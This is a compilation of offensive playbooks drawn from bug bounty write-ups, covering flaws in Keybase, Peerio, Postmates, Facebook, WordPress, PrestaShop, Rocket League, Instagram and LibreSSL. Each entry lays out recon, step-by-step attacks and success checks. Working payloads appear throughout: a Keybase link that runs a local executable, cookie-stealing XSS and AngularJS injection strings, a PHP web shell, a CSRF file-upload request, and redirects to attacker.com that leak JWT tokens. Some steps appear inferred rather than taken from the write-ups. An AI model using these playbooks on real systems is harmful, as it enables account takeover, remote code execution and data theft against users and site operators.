trigger_conditions.when_to_apply: When the Keybase client processes specially crafted messages containing encoded link objects, particularly within the context of XLM payment requests, and the target is using a vulnerable Windows client.
prerequisites: Attacker and victim both have Keybase accounts and are in a chat conversation.
Victim is using a Windows Keybase client.
Attacker can send a message or an XLM payment request to the victim.
applicability_signals: Keybase client allows sending messages with arbitrary URI schemes and display text.
Keybase client renders messages containing `$>kb$<base64_encoded_json>$<kb$` as links.
XLM payment request messages are processed by the client, allowing for custom messages.
skip_if: Victim is not using a Windows client.
Keybase client has been patched to sanitize or disallow arbitrary URI schemes in link objects.

recon_steps: Identify a Keybase chat conversation with a target user.
Observe how the Keybase client renders different types of links and special characters in messages.
attack_steps: Step 1: Craft a base64 encoded JSON string representing a malicious link object. Example: `{"typ":4,"link":{"display":"http://www.example.com","url":"C:\windows\system32\calc.exe","punycode":""}}`
Step 2: Construct the full payload string: `$>kb$<base64_encoded_json>$<kb$`
Step 3: Send this payload as a message in a chat to the target user.
Step 4 (Alternative): Initiate an XLM payment request to the target user and set the crafted payload as the message for the payment request.
Step 5: Instruct the target user to click on the generated link in the chat message or the payment request.
tools_recommended: Online Base64 encoder/decoder for crafting JSON payloads.
Keybase client application for sending messages and payment requests.
success_indicators: The victim's Windows machine executes the specified command (e.g., Calculator opens).
An SMB connection is observed from the victim's machine to the attacker-controlled SMB server if a file path was used.
The Keybase client does not show an error and the link is clickable.
failure_indicators: The link is not rendered or is rendered as plain text.
Clicking the link results in an error or a web browser opening a legitimate URL instead of executing a local command.
Keybase client reports an error about invalid message format or URL.

playbooks.impact: Remote Code Execution (RCE) on the victim's Windows machine, allowing an attacker to run arbitrary commands with the privileges of the Keybase application.
playbooks.key_lesson: Always sanitize user-controlled URI schemes and ensure that display text cannot be decoupled from safe URLs in rich text rendering, especially when targeting desktop applications.

meta.title: XSS in Peerio 2 Windows Application

tech_stack_fingerprints: Uses a web-based application internally for the chat interface.

trigger_conditions.when_to_apply: When the Peerio desktop application renders user-provided input from the chat feature without proper sanitization.
prerequisites: Attacker must have an authenticated account on Peerio.
applicability_signals: Observed behavior where input in the chat box is rendered directly, suggesting a lack of sanitization.
skip_if: All chat messages are properly escaped or filtered for script tags, event handlers, etc.

recon_steps: Interact with the Peerio desktop application's chat feature to understand how user input is rendered.
Observe if raw HTML or JavaScript payloads are directly reflected in the chat interface.
attack_steps: Step 1: Open a chat session within the Peerio desktop application.
Step 2: Type a known XSS payload (e.g., `<script>alert(1)</script>`) into the chat input box.
Step 3: Send the message and observe if the payload executes (e.g., an alert box pops up).
tools_recommended: Peerio Desktop Application
success_indicators: An alert box pops up, or any other JavaScript execution occurs when a payload is sent via the chat input.
failure_indicators: The payload is displayed as plain text or is stripped out. Suggestion: Investigate other input vectors within the application if available.

playbooks.impact: Execution of arbitrary JavaScript in the context of the Peerio desktop application for the affected user, potentially leading to session hijacking, data exfiltration, or further compromise.
playbooks.key_lesson: Always sanitize user-provided input in chat or message features to prevent Cross-Site Scripting (XSS) vulnerabilities, especially when the application uses a web-based rendering engine internally.

meta.title: Web Cache Poisoning in Postmates [$1500]

trigger_conditions.when_to_apply: When the target's web server is vulnerable to web cache poisoning, allowing an attacker to influence cached responses.
prerequisites: Discovery of an endpoint that is prone to cache poisoning.
applicability_signals: Presence of the /v1/experiments endpoint.
The endpoint accepts parameters that can be manipulated to inject XSS payloads.
The response from the endpoint is cacheable.
The cached response contains sensitive user information.
skip_if: The target's web server does not cache responses from the /v1/experiments endpoint.
The /v1/experiments endpoint does not reflect user-controlled input in a way that allows for cache poisoning.

recon_steps: Step 1: Use Burp Suite to crawl the target website to identify potential endpoints and parameters.
Step 2: Analyze the response of the /v1/experiments endpoint for cacheability and parameter manipulation possibilities.
attack_steps: Step 1: Send a request to `https://support.postmates.com/v1/experiments?requester_type=customer` and observe the response.
Step 2: Modify the `requester_type` parameter value to inject an XSS payload. The writeup mentions editing 'email' in an XSS payload previously, and then changing `requester_type`.
Step 3: Forward the manipulated request through Burp Suite to trigger the cache poisoning.
Step 4: Observe the login page for cached user information, indicating successful poisoning.
payloads_or_patterns: Insufficient detail in writeup (mention of editing 'email' in XSS payload and changing 'requester_type' parameter, but not the exact payload).
tools_recommended: Burp Suite (for crawling, request manipulation, and observing responses)
success_indicators: The login page displays cached user information from other users.
Successful XSS execution in the cached response.
failure_indicators: No cache poisoning occurs, and the login page does not display unexpected user information.
Responses from the /v1/experiments endpoint are not cacheable.

playbooks.impact: Attacker can poison the web cache of Postmates, leading to the display of cached user information (including potentially sensitive details) on the login page to any user accessing the cached version. This could lead to information disclosure and credential harvesting if users are tricked into interacting with the poisoned cache.
playbooks.key_lesson: Always investigate how user-controlled input is handled in API endpoints that are subject to caching, as manipulation can lead to cache poisoning and sensitive data exposure.

meta.title: Messenger Rooms Bug Bounty Write-up

affected_components: Anonymous guest user functionality (referred to as '[REDACTED]')

trigger_conditions.when_to_apply: When a feature allows unauthenticated users to join a call via an invite link, and this unauthenticated user is granted excessive permissions beyond just joining the call.
prerequisites: A feature that generates invite links for calls.
The ability for unauthenticated users to join these calls.
applicability_signals: Existence of a guest user or similar mechanism for anonymous call participation.
Endpoints related to call creation that may be accessible via this guest user.
skip_if: Anonymous users are strictly limited to only joining calls and cannot initiate any other actions.
API calls for creating calls require a valid authenticated user session.

recon_steps: Step 1: Analyze network traffic when joining a Messenger Room call as an unauthenticated user.
Step 2: Identify API endpoints used by the guest user, particularly those related to call management or creation.
attack_steps: Step 1: Attempt to create a new Messenger Call using the guest user's session/authentication token.
Step 2: Observe the response to determine if the creation was successful.
Step 3: If call creation is successful, attempt to browse other Facebook content using the guest user to confirm broader privilege escalation.
payloads_or_patterns: Parameters may include title, description, etc. - exact payload depends on API structure.
tools_recommended: Burp Suite: Intercept and modify requests made by the unauthenticated guest user.
Postman: Replay and modify identified API requests.
success_indicators: A successful API response (e.g., 2xx status code) from an attempt to create a new Messenger Call while authenticated as the guest user.
The ability to browse Facebook content (even public) that should be restricted to authenticated users.
failure_indicators: API calls to create a new call return 401 Unauthorized or 403 Forbidden, indicating proper authorization checks.
Attempts to browse public content are also blocked, suggesting tight scope for the guest user.

playbooks.impact: An unauthenticated guest user can create new Messenger Rooms, bypassing intended authorization controls. Additionally, the guest user can browse Facebook content beyond its intended scope, potentially leading to information disclosure if privacy settings are not robust.
playbooks.key_lesson: Ensure that unauthenticated or guest user accounts have extremely limited privileges, restricted only to the specific functionality they are intended to access, and do not allow them to initiate actions reserved for authenticated users.

meta.title: Hiding ourself in close friend’s list and avoiding victim to remove us from his close friend’s list.

trigger_conditions.when_to_apply: When an attacker is added to a victim's 'Close Friends' list, and the attacker can temporarily deactivate and reactivate their account.
prerequisites: Attacker (UserOne) must be added to the victim's (UserTwo) Close Friends list.
applicability_signals: User is able to access and manage their 'Close Friends' lists at https://www.facebook.com/bookmarks/lists.
skip_if: Victim cannot add or remove users from their Close Friends list.

recon_steps: Step 1: Confirm the existence and functionality of the 'Close Friends' list feature by navigating to https://www.facebook.com/bookmarks/lists.
Step 2: Verify that the target user (Victim) has added the attacker (UserOne) to their 'Close Friends' list.
attack_steps: Step 1: UserOne (Attacker) deactivates their Facebook account.
Step 2: UserTwo (Victim) attempts to remove UserOne from their 'Close Friends' list.
Step 3: UserOne (Attacker) reactivates their Facebook account.
Step 4: UserTwo (Victim) checks their 'Close Friends' list again to confirm UserOne is still present.
payloads_or_patterns: Account deactivation/reactivation process within Facebook's user settings.
tools_recommended: Browser with Facebook logged in as both UserOne and UserTwo.
success_indicators: UserTwo is unable to remove UserOne from their 'Close Friends' list after UserOne deactivates and reactivates their account.
UserOne remains in UserTwo's 'Close Friends' list even after account reactivation.
failure_indicators: UserTwo can successfully remove UserOne from the 'Close Friends' list after reactivation - this indicates the vulnerability is patched or not present.
UserOne is removed from the 'Close Friends' list upon account deactivation and does not reappear after reactivation.

playbooks.impact: The attacker can remain on the victim's 'Close Friends' list without the victim's knowledge or consent, even after deactivating and reactivating their account. This could be used for social engineering, targeted content delivery, or other malicious activities that rely on perceived closeness or access to specific friend lists.
playbooks.key_lesson: Investigate account lifecycle events (deactivation/reactivation) and their impact on authorization and list memberships, especially for features that rely on user relationships.

meta.title: Misconfigured WordPress takeover to Remote Code Execution

trigger_conditions.when_to_apply: When a WordPress installation landing page is encountered, indicating a potentially incomplete setup or misconfiguration.
prerequisites: Target subdomain serves a WordPress installation landing page.
The attacker can create and manage a remote MySQL database.
applicability_signals: WordPress installation page is accessible.
The website's database configuration is not yet complete.
Ability to connect to a remote database server (e.g., Azure MySQL).
skip_if: The WordPress installation is already complete.
The target server does not allow outbound connections to external database servers.
A WAF blocks attempts to upload or execute PHP files.

recon_steps: Step 1: Browse to the target URL and identify if a WordPress installation landing page is present.
Step 2: Attempt to enumerate database credentials for the existing WordPress installation; if unsuccessful, proceed to the next step.
Step 3: Investigate the possibility of connecting to a remote database service to complete the WordPress installation.
attack_steps: Step 1: Create a remote MySQL database instance (e.g., using Azure MySQL service).
Step 2: Configure firewall rules for the remote MySQL database to allow connections from the target server's IP address (if identifiable or obtainable).
Step 3: Create a database within the remote MySQL instance.
Step 4: Navigate to the WordPress setup page on the target subdomain.
Step 5: Enter the credentials and hostname for the attacker-controlled remote MySQL database and complete the WordPress installation.
Step 6: Log in to the WordPress admin panel of the compromised website.
Step 7: Download a legitimate WordPress theme.
Step 8: Modify the theme's files to include a PHP web shell.
Step 9: Upload the modified theme via the WordPress admin panel.
Step 10: Navigate to the uploaded theme's directory (e.g., /wp-content/themes/<theme_name>/) to access the web shell.
Step 11: Execute commands through the web shell to confirm Remote Code Execution.
payloads_or_patterns: PHP Web Shell (e.g., a simple `<?php system($_GET['cmd']); ?>` or a more advanced one)
Modified WordPress theme containing the PHP web shell.
tools_recommended: Burp Suite: To intercept and modify HTTP requests, especially during the theme upload phase.
SQL Client (e.g., Sequel Pro, MySQL Workbench): To manage and create databases on the remote MySQL server.
A text editor: To create and modify the PHP web shell and theme files.
success_indicators: Successful connection to the remote MySQL database during WordPress setup.
WordPress website accessible after setup.
Ability to log into the WordPress admin panel.
Successful upload of a custom theme.
Accessing the web shell URL (e.g., `http://<TARGET_URL>/wp-content/themes/<theme_name>/shell.php?cmd=whoami`) returns output from executed commands.
failure_indicators: Database connection errors during WordPress setup (e.g., firewall blocking, incorrect credentials). Pivot: Re-evaluate firewall rules or try different database credentials.
Inability to upload the theme (e.g., file type restrictions, size limits). Pivot: Try to find alternative methods for uploading files, or exploit other WordPress vulnerabilities.
Web shell not found or returning 404 error. Pivot: Verify the theme path and ensure the web shell file was correctly placed and named.

playbooks.impact: Attacker gains full control over the WordPress CMS and the underlying web server, allowing for arbitrary file uploads, execution of commands, data exfiltration, and further compromise of the server.
playbooks.key_lesson: When encountering an incomplete WordPress installation, investigate the possibility of completing the setup with attacker-controlled infrastructure, as this can lead to full CMS and server compromise.

meta.title: The Secret sauce of bug bounty

trigger_conditions.when_to_apply: When the target application uses AngularJS and allows user-controlled input for names which is rendered elsewhere without proper sanitization, and there's a character limit on input fields.
prerequisites: Target application uses AngularJS.
Attacker can register an account and create a profile.
User input for name fields is reflected in other parts of the application.
Input fields have character limitations.
applicability_signals: Input fields accepting alphanumeric characters for names.
AngularJS double-curly brace `{{ }}` syntax for rendering.
Server-side processing of name inputs that are later displayed.
URL parameters or POST data containing user profile information.
skip_if: Input sanitization aggressively filters out special characters or code execution attempts.
AngularJS expression parser is disabled or heavily restricted.
All user input is properly escaped before rendering.

recon_steps: Step 1: Register an account on the target application and attempt to create a profile.
Step 2: Inspect the HTML source code and network requests to identify if AngularJS is being used (look for AngularJS related JS files, `ng-app` directives, or `{{ }}` syntax).

Step 3: Submit various inputs in the name fields (e.g., mathematical expressions, special characters) and observe how they are rendered or processed to understand input handling and identify potential injection points.
attack_steps: Step 1: Attempt to inject a simple AngularJS expression like `{{1*1}}` into the `firstName` or `lastName` field to confirm expression evaluation.
Step 2: If expression evaluation works, attempt to inject the payload `{{constructor.constructor('alert(document.cookie)')()}}` into one of the name fields.

Step 3: If the payload is too long due to character limits, split it between `firstName` and `lastName` fields, for example: `firstName={{constructor.constructor('alert(document.cookie)')()` and `lastName=}}()}}`.
Step 4: Save the profile and check if the alert box appears when viewing the profile or any other page that renders the user's name.
tools_recommended: Burp Suite or OWASP ZAP for intercepting and modifying requests.
Browser Developer Tools for inspecting HTML and JavaScript.
success_indicators: An `alert(document.cookie)` box pops up in the browser, confirming XSS execution.
The injected AngularJS expression is rendered as executed code, not plain text.
The payload `{{constructor.constructor('alert(document.cookie)')()}}` is visible or processed in the page's source or DOM.
failure_indicators: The payload is rendered as plain text or shows an error, indicating input sanitization or a lack of AngularJS expression evaluation.
A WAF blocks the request.
The payload is truncated due to character limits and no split payload works. Consider looking for other vulnerabilities or alternative XSS vectors.
No cookie access even after successful XSS due to HttpOnly flag (as mentioned in writeup), requiring a different attack vector like session hijacking via API if possible.

playbooks.impact: An attacker can execute arbitrary JavaScript in the context of other users who view the compromised profile, leading to Stored XSS. This can be used for session hijacking (if cookies are not HttpOnly), performing actions on behalf of the user, defacing profiles, or phishing.
playbooks.key_lesson: Always test for AngularJS expression injection in user-controlled input fields, especially when dealing with string concatenation or rendering without proper sanitization, and be prepared to split payloads to bypass character limitations.

meta.title: DOM based open redirect to the leak of a JWT token

trigger_conditions.when_to_apply: When a logout page contains JavaScript that redirects based on a URL parameter, and this redirection involves an OAuth flow that might expose tokens in the referrer header.
prerequisites: User must be logged in and then log out, reaching a specific landing page.
The landing page must have a JavaScript event listener for a click action.
The JavaScript must use a URL parameter to construct the redirect URL.
The redirect URL must be part of an OAuth flow.
applicability_signals: Presence of a '/logout/landing.html?originalUrl=/login' pattern.
JavaScript code on the page that manipulates `window.location` or `window.location.href` based on `originalUrl`.
The OAuth API signing a pathname provided on the `originalUrl` parameter.
skip_if: Logout page does not contain redirect logic based on URL parameters.
Redirect does not involve an OAuth flow.
Referrer header is not sent or is stripped by the browser/server.

recon_steps: Navigate to the logout functionality of the target application.
Observe the redirect URL after initiating logout. Look for parameters like `originalUrl`.
Analyze the JavaScript code on the landing page for DOM manipulation related to redirection.
attack_steps: Step 1: Craft a URL for the logout landing page with a malicious `originalUrl` parameter. For example: <TARGET_URL>/logout/landing.html?originalUrl=//attacker.com/@attacker.net
Step 2: Trigger the logout process, which should lead the victim to the crafted URL.
Step 3: Observe the HTTP requests made by the victim's browser to attacker.com. The JWT token should be present in the `Referer` header.
Step 4: Use the leaked JWT token to authenticate as the victim.
tools_recommended: Burp Suite (for generating collaborator domain and observing incoming requests/headers)
success_indicators: A request is received at the attacker's controlled domain (<BURP_COLLABORATOR_DOMAIN>).
The `Referer` header in the incoming request contains a valid JWT token.
Ability to authenticate to the target application using the leaked JWT token.
failure_indicators: No request is received at the attacker's domain (e.g., the redirect did not occur, or the URL was malformed).
The `Referer` header does not contain a JWT token or contains unexpected data (e.g., the redirect URL itself).
The application does not send the `Referer` header for this type of redirect (try different URL structures or payloads).

playbooks.impact: Account Takeover (ATO) by leveraging a leaked JWT token, allowing the attacker to impersonate the victim.
playbooks.key_lesson: Always scrutinize DOM-based redirections on logout or other sensitive pages, as they can lead to sensitive information leakage, especially when interacting with OAuth flows or third-party services.

meta.title: Abusing HTTP Path Normalization and Cache Poisoning to steal Rocket League accounts

trigger_conditions.when_to_apply: When the target application uses OAuth for third-party integrations and has cacheable endpoints that can be influenced by path normalization.
prerequisites: Target application uses OAuth for linking external accounts (e.g., Twitch, Steam).
Target application has a whitelist of allowed redirect URLs.
applicability_signals: An endpoint like /out?type=p&platform=twitch&return_to=<URL> exists.
The application returns JWT tokens in the URL fragment (#) or as a query parameter.
The application's web server or cache is susceptible to HTTP cache poisoning.
The application allows URL path normalization bypasses (e.g., handling of %23).
skip_if: No OAuth flows are present.
The application strictly validates redirect URLs and does not allow for any form of bypass.
The web server or CDN is hardened against cache poisoning attacks.

recon_steps: Intercept HTTP traffic to identify OAuth flows and associated endpoints.
Analyze the request/response for OAuth parameters like `return_to`, `user_url`, `error_url`, and JWT tokens.
Test the behavior of various URL formats and special characters (e.g., `%23`) in parameters like `return_to`.
Identify endpoints that are likely to be cached by observing response headers like `Cache-Control`, `Expires`, and `ETag`.
attack_steps: Step 1: Craft a malicious URL targeting an OAuth endpoint, for example: GET /out?type=p&platform=twitch&return_to=https://www.attacker.com/&user_url=&error_url= HTTP/1.1 Host: oauth2.rocketleague.com

Step 2: Introduce a cacheable element to the response. This might involve manipulating the `return_to` URL with a specific path that the cache interprets as a distinct resource. For example, using `%23` to append the JWT to a fragment identifier.
Step 3: Poison the cache for the crafted URL by ensuring a response is served that includes attacker-controlled content or redirects to an attacker-controlled domain.
Step 4: Induce a legitimate user to visit the poisoned cache entry. This can be achieved through social engineering or by exploiting other vulnerabilities that lead users to specific URLs.

Step 5: When the user's browser requests the cached resource, the poisoned cache will serve the attacker-controlled response, potentially stealing the user's JWT token if it's appended to the URL fragment and can be parsed by JavaScript on the attacker's site.
tools_recommended: Burp Suite: To intercept, modify, and replay HTTP requests, and to analyze cache headers.
Wireshark: For decrypting and analyzing SSL/TLS traffic if Burp Suite is not sufficient for proxying.
A custom script or server to host the attacker's domain and capture JWT tokens.
success_indicators: The attacker's domain receives a request containing the user's JWT token appended to the URL fragment (e.g., `https://www.attacker.com/#header.payload.signature`).
The user's account on www.rocketleague.com is successfully authenticated by the attacker's server using the stolen JWT.
failure_indicators: The `return_to` URL is strictly validated and does not allow for arbitrary domains or path manipulations.
The application uses POST requests for OAuth authorization, making cache poisoning more difficult.
Responses from the target endpoint are not cacheable.
The JWT token is not exposed in a parsable format (e.g., only in HTTP headers that are not sent to the client's browser.

playbooks.impact: Stealing of user JWT tokens via cache poisoning, allowing an attacker to impersonate authenticated users on www.rocketleague.com and potentially gain unauthorized access to their accounts or associated services. This could lead to account takeover.
playbooks.key_lesson: Always test for HTTP cache poisoning vulnerabilities in conjunction with other attack vectors like OAuth flows, especially when URLs can be manipulated with special characters or path normalization bypasses.

meta.title: CSRF to RCE bug chain in Prestashop v1.7.6.4 and below
meta.vuln_type: CSRF | RCE | Stored XSS | Unrestricted file upload

trigger_conditions.when_to_apply: When an authenticated user can be tricked into performing actions via CSRF, particularly file uploads in the admin panel.
prerequisites: The target must be running a vulnerable version of PrestaShop (v1.7.6.4 and below).
The attacker must have a way to trick the victim into visiting a malicious page.
applicability_signals: The presence of file upload functionality within the admin panel, especially for modules or themes.
Admin actions are not protected by sufficiently robust CSRF tokens or have predictable token generation.
skip_if: Admin panel actions are protected by SameSite cookies or other robust anti-CSRF measures that cannot be bypassed.
All file uploads are strictly validated against allowed file types and sizes.

recon_steps: Step 1: Fingerprint PrestaShop version by checking version number in footer or specific file paths (e.g., /themes/classic/css/global.css).
Step 2: Identify admin panel endpoints, particularly those handling module installation, theme updates, or general file uploads.
attack_steps: Step 1: Identify a file upload form in the PrestaShop admin panel that is vulnerable to unrestricted file upload (e.g., for modules or themes). This typically involves uploading a file without sufficient validation of its type or content.
Step 2: Create a malicious HTML page hosted on an attacker-controlled server. This page will contain JavaScript to submit a form that targets the vulnerable file upload endpoint.

Step 3: Construct a payload that bypasses file type restrictions by using double extensions (e.g., .php.jpg) or by manipulating the Content-Type header. A common RCE payload involves uploading a file with a `.php` extension.

Step 4: Craft a CSRF request that triggers the file upload functionality. This request should be embedded within an HTML form on the attacker's page, designed to be auto-submitted or triggered by user interaction.

Step 5: If the file upload is successful and the uploaded PHP file is placed in a web-accessible directory (often within the theme or module structure), the attacker can then craft a second request to execute arbitrary code by accessing the uploaded PHP file via a URL.

Step 6: To achieve RCE, the uploaded PHP file would contain a webshell or a command execution payload. The attacker then navigates to the URL of the uploaded file on the target PrestaShop instance to execute their payload.
payloads_or_patterns: HTML form for CSRF to trigger file upload.

Example payload structure: `POST /admin-your-shop-folder/index.php?controller=AdminModules&configure=your_module&token=CSRF_TOKEN HTTP/1.1
Host: <TARGET_URL>
Content-Type: multipart/form-data; boundary=---------------------------1234567890

-----------------------------1234567890
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"
Content-Type: image/jpeg

<?php /* webshell content here */ ?>
-----------------------------1234567890--`
tools_recommended: Burp Suite: To intercept and analyze requests, identify vulnerable endpoints, and craft payloads.
Browser Developer Tools: To understand form submissions and JavaScript behavior.
Metasploit (optional): For pre-built exploit modules if available or for post-exploitation.
success_indicators: HTTP response 200 OK from the file upload request, indicating successful upload.
The uploaded file (e.g., shell.php) being accessible via a URL on the target server.
Successful execution of a command via the uploaded webshell (e.g., `curl <TARGET_URL>/themes/your_theme/shell.php.jpg?cmd=id`).
failure_indicators: HTTP 400 or 406 Bad Request/Not Acceptable for file uploads, indicating server-side validation is working.
HTTP 403 Forbidden, indicating authorization issues or WAF blocking.
Uploaded file is not executable or placed in a non-accessible directory.
If successful file upload results in an error or a non-PHP file, try different file extensions or content types.

playbooks.impact: Remote Code Execution (RCE) on the web server, allowing the attacker to take full control of the PrestaShop installation, steal sensitive data (customer information, orders), deface the website, or use the server for malicious activities.
playbooks.key_lesson: Always validate uploaded file types, extensions, and content server-side, and implement robust CSRF protection for all administrative actions, especially those involving file manipulation.

meta.title: Instagram Still Send New DMs and Video Calls to Device After Logout

trigger_conditions.when_to_apply: When a user logs out of their Instagram account and subsequently ends the attacker's session from the 'Login Activity' settings, but the attacker's device continues to receive new DM or video call notifications.
prerequisites: Attacker must have successfully logged into the victim's account.
Victim must detect the unauthorized login and initiate the session termination process.
applicability_signals: Victim navigates to 'Settings' -> 'Security' -> 'Login Activity'.
Victim sees the attacker's active session and successfully logs them out.
skip_if: Device stops receiving any notifications after the victim logs out the attacker.

recon_steps: Step 1: Log in to a victim's Instagram account from an attacker-controlled device.
Step 2: Observe if new DM or video call notifications are received on the attacker's device.
Step 3: Instruct the victim to log out the attacker's session via 'Login Activity' settings.
attack_steps: Step 1: Attacker logs into victim's account.
Step 2: Victim identifies attacker's session in 'Login Activity'.
Step 3: Victim logs out attacker's session.
Step 4: Attacker sends a new DM or initiates a video call to the victim's account.
Step 5: Observe if the attacker's device continues to receive notifications for the new DM or video call despite the logout.
payloads_or_patterns: N/A (relies on victim's action and platform's notification service)
tools_recommended: Burp Suite (to monitor network traffic for notification related requests, although not explicitly stated in writeup)
Instagram app (for simulating DMs and video calls)
success_indicators: Attacker's device receives notifications for new DMs or video calls on the victim's account *after* the victim has logged out the attacker's session from 'Login Activity'.
failure_indicators: Attacker's device stops receiving notifications immediately after the victim logs out the session. This indicates a proper session invalidation.

playbooks.impact: An attacker can continue to receive notifications of incoming messages and video calls to the victim's account even after their session has been terminated by the victim. This can lead to privacy breaches and the attacker being aware of ongoing communications on the victim's account.
playbooks.key_lesson: Ensure that session tokens are properly invalidated on the server-side and client-side when a user logs out or a session is terminated via security settings, and that push notification services are also de-registered or invalidated accordingly.

meta.title: LibreSSL and OSS-Fuzz

tech_stack_fingerprints: LibreSSL (inferred from context of the article about integrating it into OSS-Fuzz)

trigger_conditions.when_to_apply: When a C/C++ project uses complex parsing or data handling logic, especially cryptographic libraries that process external inputs. The specific vulnerability targeted ASN1_INTEGER functions, implying issues with integer parsing and size handling.
prerequisites: The target project must be integratable with OSS-Fuzz.
applicability_signals: Presence of ASN.1 parsing or handling functions.
Use of integer types for sizes or offsets where out-of-bounds or malformed data could lead to memory corruption.
skip_if: The project does not have complex data parsing or input validation.
The project is not amenable to fuzzing due to its architecture or dependencies.

recon_steps: Step 1: Identify C/C++ projects that are candidates for fuzzing via OSS-Fuzz.
Step 2: Analyze the project's codebase for areas processing untrusted input, particularly functions dealing with data sizes, lengths, or complex data structures like ASN.1.
attack_steps: Step 1: Integrate the target library (LibreSSL in this case) into the OSS-Fuzz framework following OSS-Fuzz documentation.
Step 2: Develop a fuzzer harness that calls the relevant functions with crafted inputs.
Step 3: Run the fuzzer on Google's infrastructure.
Step 4: Analyze crash reports and investigate memory corruption bugs identified by the fuzzer.
payloads_or_patterns: Fuzzing inputs designed to trigger edge cases in ASN.1 integer parsing, potentially involving negative sizes, excessively large values, or malformed structures leading to incorrect size calculations.
tools_recommended: OSS-Fuzz
Clang Sanitizers (AddressSanitizer, UndefinedBehaviorSanitizer)
GDB or LLDB for debugging crashes
success_indicators: OSS-Fuzz reports a crash with sanitizers indicating memory corruption (e.g., heap-buffer-overflow, use-after-free, out-of-bounds read/write).
Successful reproduction of the crash locally using the provided crashing input.
Code analysis revealing logic errors in size calculations or integer conversions (e.g., `a_int.c` commit showing range checks for ASN1_INTEGER sizes).
failure_indicators: No crashes reported by OSS-Fuzz after a significant runtime.
Crashes are consistently due to unrelated issues or expected program termination, not memory corruption.
Fuzzer harness fails to compile or run correctly.
